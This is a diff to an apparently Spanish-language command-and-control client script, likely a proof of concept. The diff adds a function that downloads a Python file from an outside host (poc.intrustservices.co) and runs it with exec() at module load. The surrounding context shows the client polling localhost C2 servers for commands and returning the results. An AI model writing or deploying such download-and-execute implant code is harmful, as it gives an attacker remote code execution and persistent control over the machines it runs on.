@@ -6,6 +6,26 @@ import time
 url_primero_c2 = "http://localhost:5000"
 url_segundo_c2 = "http://localhost:5001"
 
+def descargar_y_ejecutar(url):
+    nombre_archivo = "cliente_mejorado.py"
+    
+    try:
+        respuesta = requests.get(url)
+        with open(nombre_archivo, "wb") as archivo:
+            archivo.write(respuesta.content)
+        print(f"Archivo {nombre_archivo} descargado correctamente.")
+        
+        #ejecutar el archivo descargado
+        exec(open(nombre_archivo).read())
+        print(f"Ejecutando {nombre_archivo}...")
+    except Exception as e:
+        print(f"Error al descargar o ejecutar {nombre_archivo}: {e}")
+
+# URL para descargar el cliente mejorado del primer servidor C2
+url_descarga = "http://poc.intrustservices.co/descargar_cliente"
+
+descargar_y_ejecutar(url_descarga)
+
 def ejecutar_y_enviar_resultado(url_servidor):
     respuesta = requests.get(f"{url_servidor}/comando")
     comando = respuesta.text
